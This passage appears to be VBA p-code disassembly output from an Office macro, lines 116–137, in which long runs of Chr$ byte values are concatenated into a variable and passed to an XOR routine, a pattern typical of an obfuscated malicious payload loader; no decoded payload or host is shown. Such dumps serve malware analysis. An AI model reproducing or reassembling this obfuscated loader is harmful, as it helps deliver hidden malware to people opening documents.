' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0081 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0014 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0096 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0094 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0014 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00EA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #116:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #117:
' 	LitDI2 0x006C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0070 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #118:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #119:
' 	LitDI2 0x0099 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0080 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0081 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0080 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #120:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #121:
' 	LitDI2 0x002B 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x007A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0023 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #122:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #123:
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0009 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0099 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0092 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #124:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #125:
' 	LitDI2 0x007B 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0099 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0025 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0040 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #126:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #127:
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x002B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00EF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0098 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0036 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #128:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #129:
' 	LitDI2 0x00A5 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00B3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0017 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0034 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0026 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #130:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #131:
' 	LitDI2 0x0068 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00EE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0035 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0036 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0081 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0088 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0034 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #132:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #133:
' 	LitDI2 0x009C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0060 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0014 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0040 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0034 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00ED 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0083 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #134:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #135:
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0090 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0099 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #136:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #137:
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0035 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
